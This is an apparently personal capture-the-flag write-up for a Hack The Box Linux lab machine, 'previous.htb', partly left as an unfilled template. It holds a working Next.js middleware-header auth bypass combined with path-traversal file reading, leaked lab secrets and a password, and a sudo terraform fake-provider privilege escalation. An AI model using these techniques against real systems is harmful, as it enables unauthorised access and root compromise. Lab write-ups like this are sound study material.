---
os: linux
status: Active
tags:
aliases:
---

# Information Gathering

Scanned top TCP ports:

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated open TCP ports:

```sh

```

---

# Enumeration

## Port 80 - HTTP (Apache)

found contact to:
```
jeremy@previous.htb
```


looking around
```js
{"credentials":{"id":"credentials","name":"Credentials","type":"credentials","signinUrl":"http://localhost:3000/api/auth/signin/credentials","callbackUrl":"http://localhost:3000/api/auth/callback/credentials"}}
```

After a while of searching, found CVE in nextjs that enable me to bypass security controls, just by adding specific header. Then found a end point that i can use to do LFI.
```http
GET /api/download?example=../../package.json HTTP/1.1
Host: previous.htb
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=75113a9f8acf2b5bfc60729770877c7bf1b0b90eb86e422e3adc63e54af7c45d%7Cd068f58d2efcca479d14be93682dcf0b71ffb2619294f679f350dee06dec8f47; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
Connection: keep-alive
```

```
.env
pages/
public/
.next/
```

```
.env file
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

```
/etc/passwd

nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

```js
MyNameIsJeremyAndILovePancakes

authorize: async e => e?.username === "jeremy" && e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes") ? {

id: "1",

name: "Jeremy"

} : null

})],

pages: {

signIn: "/signin"

},

9￼} : null
10￼
11￼})],
12￼
secret: process.env.NEXTAUTH_SECRET

},
```
---

# Exploitation

## SQL Injection


---

# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---

# Privilege Escalation to xxx

## Local enumeration

```sh
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply

```
## Privilege Escalation vector

### Terraform
it need providers so it can know how to execute and those providers are just binaries, 

---

### 1. Pick a directory you control
```
mkdir -p /home/jeremy/fake_provider
```

2. Update your `~/.terraformrc`
Change the dev override to point at your directory instead of `/usr/local/go/bin`.
```
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/home/jeremy/fake_provider"
  }
  direct {}
}

```

3. put  a provider binary in your directory
```
touch /home/jeremy/fake_provider/terraform-provider-examples
chmod +x /home/jeremy/fake_provider/terraform-provider-examples

echo '#!/bin/sh' > /home/jeremy/fake_provider/terraform-provider-examples
echo 'echo "Custom provider executed as: $(id)"' >> /home/jeremy/fake_provider/terraform-provider-examples
chmod +x /home/jeremy/fake_provider/terraform-provider-examples

sudo /usr/bin/terraform -chdir=/opt/examples apply
```

---

# Trophy

{{image}}

>[!todo] **User.txt**
>flag

>[!todo] **Root.txt**
>flag

**/etc/shadow**

```sh

```

# Resolution summary

>[!summary]
>- Step 1
>- Step 2
